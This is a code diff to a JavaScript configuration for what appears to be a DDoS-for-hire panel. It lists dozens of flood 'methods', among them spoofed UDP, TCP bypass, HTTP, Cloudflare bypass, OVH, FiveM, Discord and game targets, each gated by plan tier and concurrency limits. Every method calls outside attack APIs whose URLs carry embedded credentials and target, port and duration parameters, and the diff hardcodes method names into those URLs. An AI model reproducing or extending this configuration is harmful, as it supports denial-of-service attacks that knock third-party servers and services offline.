@@ -32,8 +32,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udp', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=udp', method: 'GET' }
       ]
     },
     {
@@ -50,7 +50,7 @@ export const DEFAULT_PAYLOAD = {
       plan_restrictions: { vip: false, holder: false },
       api_links: [
         { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tcp', method: 'GET' }
       ]
     },
     {
@@ -66,8 +66,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tcpbypass', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=udpbypass', method: 'GET' }
       ]
     },
     {
@@ -84,7 +84,7 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: true, holder: false },
       api_links: [
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=discord', method: 'GET' },
         { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
       ]
     },
@@ -101,11 +101,277 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: true, holder: false },
       api_links: [
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=fivem', method: 'GET' },
         { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
       ]
     },
 
+
+    {
+      name: 'udp-pps',
+      description: 'Method udp-pps',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udp-pps', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: '!http',
+      description: 'Method !http',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!http', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: '!pps',
+      description: 'Method !pps',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!pps', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: '!tcp',
+      description: 'Method !tcp',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!tcp', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: '!udp',
+      description: 'Method !udp',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=!udp', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'bypass',
+      description: 'Method bypass',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=bypass', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'cloudflare',
+      description: 'Method cloudflare',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=cloudflare', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'homehold',
+      description: 'Method homehold',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=homehold', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'httpsbypass',
+      description: 'Method httpsbypass',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=httpsbypass', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'ovh-priv',
+      description: 'Method ovh-priv',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=ovh-priv', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'spam-udp',
+      description: 'Method spam-udp',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=spam-udp', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'spoof-udp',
+      description: 'Method spoof-udp',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=spoof-udp', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'tls-free',
+      description: 'Method tls-free',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tls-free', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
+
+    {
+      name: 'udp-free',
+      description: 'Method udp-free',
+      enabled: true,
+      default_access: 1,
+      target_type: 'ip',
+      default_port: 80,
+      max_concurrents: 5,
+      max_slots: 5,
+      min_time: 30,
+      max_time: 60,
+      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
+      plan_restrictions: { vip: false, holder: false },
+      api_links: [
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udp-free', method: 'GET' },
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' }
+      ]
+    },
     // === LAYER 4: TCP Methods ===
     {
       name: 'tcp',
@@ -120,8 +386,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=tcp', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=game', method: 'GET' }
       ]
     },
     {
@@ -138,7 +404,7 @@ export const DEFAULT_PAYLOAD = {
       plan_restrictions: { vip: false, holder: false },
       api_links: [
         { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=ovh', method: 'GET' }
       ]
     },
     {
@@ -154,8 +420,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=tcpbypass', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=http', method: 'GET' }
       ]
     },
     {
@@ -172,7 +438,7 @@ export const DEFAULT_PAYLOAD = {
       plan_restrictions: { vip: true, holder: false },
       api_links: [
         { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=browser', method: 'GET' }
       ]
     },
 
@@ -190,8 +456,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=http', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tls', method: 'GET' }
       ]
     },
     {
@@ -208,7 +474,7 @@ export const DEFAULT_PAYLOAD = {
       plan_restrictions: { vip: false, holder: false },
       api_links: [
         { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=udpbypass', method: 'GET' }
       ]
     },
     {
@@ -294,8 +560,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=ovh', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=ovh', method: 'GET' }
       ]
     },
     {
@@ -345,8 +611,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=discord', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=discord', method: 'GET' }
       ]
     },
     {
@@ -363,8 +629,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=fivem', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=fivem', method: 'GET' }
       ]
     },
     {
@@ -380,8 +646,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=game', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=game', method: 'GET' }
       ]
     },
     {
@@ -397,8 +663,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={method}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=browser', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=browser', method: 'GET' }
       ]
     },
     {
@@ -415,8 +681,8 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method={tls}', method: 'GET' },
-        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' }
+        { name: 'ReverbNet', url: 'https://api.reverb.services/api/attack?username=byte&password=byte&target={target}&port={port}&time={time}&method=tls', method: 'GET' },
+        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method=tls', method: 'GET' }
       ]
     },
 
